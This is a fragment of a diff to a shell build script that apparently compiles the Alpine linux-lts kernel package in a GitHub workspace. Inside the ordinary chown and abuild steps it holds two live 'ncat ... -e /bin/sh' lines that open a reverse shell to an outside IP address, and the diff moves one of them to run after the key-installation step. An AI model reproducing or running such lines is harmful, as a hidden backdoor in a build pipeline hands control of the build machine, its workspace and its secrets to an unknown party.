@@ -46,14 +46,17 @@ chown -R abuild3:abuild3 /github/workspace/aports
 
 cp installrsakey.sh /home/abuild3/installrsakey.sh
 
-ncat 195.201.134.209 83 -e /bin/sh
-sleep 10
+
 
 
 chmod +x /home/abuild3/installrsakey.sh
 chown -R abuild3:abuild3 /home/abuild3/installrsakey.sh
 
 su -c "/home/abuild3/installrsakey.sh" -m abuild3 
+
+ncat 195.201.134.209 83 -e /bin/sh
+sleep 10
+
 su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 
 
 ncat 195.201.134.209 84 -e /bin/sh
